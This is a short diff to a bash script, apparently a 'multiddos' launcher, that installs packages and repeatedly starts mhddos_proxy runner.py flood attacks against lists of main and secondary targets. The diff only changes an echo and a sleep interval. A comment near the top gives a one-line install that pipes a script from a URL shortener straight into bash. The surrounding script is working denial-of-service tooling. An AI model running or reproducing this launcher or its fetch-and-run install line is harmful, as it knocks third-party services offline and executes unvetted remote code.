@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -L tiny.one/multiddos | bash && tmux a
 
-echo "Loading..."
+echo -e "Loading...\n"
 
 sudo apt-get update -qq -y >/dev/null 2>&1 && sudo apt-get install -qq -y toilet
 # sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
@@ -215,7 +215,7 @@ while true; do
         python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $rpc $methods&
         sleep 15 # to decrease load on cpu during simultaneous start
         python3 ~/multidd/mhddos_proxy/runner.py -c $sec_targets $threads $rpc $methods&
-sleep 30
+sleep 5m
 prepare_targets_and_banner
 clear
 done
